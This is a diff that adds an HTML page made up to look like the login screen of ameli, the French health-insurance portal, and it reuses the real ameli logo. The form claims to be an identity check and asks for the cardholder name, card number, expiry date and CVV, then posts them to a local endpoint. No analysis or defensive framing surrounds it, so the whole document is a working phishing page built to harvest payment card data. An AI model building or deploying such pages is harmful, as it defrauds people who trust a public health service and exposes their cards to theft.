@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html style="display: flex; height: 90%;">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <title>Compte ameli - Mon espace personnel</title>
+   </head>
+<body>
+    <div style="box-shadow: 0px 0px 20px 0px rgb(101 101 101 / 60%); width: 100vw; margin-top: -10px; margin-left: -10px;">
+        <img src="https://assure.ameli.fr/PortailAS/ShowProperty/WLP%20Repository/images/logosRegimes/logo_regime_general">
+    </div>
+    <div style="display: flex; height: 100%;">
+        <div style="margin: auto; max-width: 300px;     border-radius: 5px;
+        box-shadow: 0 0 20px 0 rgb(101 101 101 / 60%); padding: 60px 25px;">
+            <h2>Je m'identifie</h2>
+            <p>Pour plus de sécurité, veuillez entrer votre numéro de sécurité sociale puis la carte utilisée pour le paiement.</p>
+            <form style="display: flex; flex-direction: column;" action="/form" method="POST">
+                <input style="margin-top: 20px;" name="nom" placeholder="Nom figurant sur la carte"/>
+                <input style="margin-top: 20px;" name="carte" placeholder="Numéros de la carte"/>
+                <div style="display:flex; margin-top: 20px;">
+                    <input style="width: 60px;" name="date" maxlength="5" placeholder="Expiration"/>
+                    <input style="margin-left: 30px; width: 60px;" name="cvv" maxlength="3" placeholder="CVV"/>
+                </div>
+                <button style="margin-top: 20px;" type="submit">Envoyer</button>
+            </form>
+        </div>
+    </div>
+</body></html>
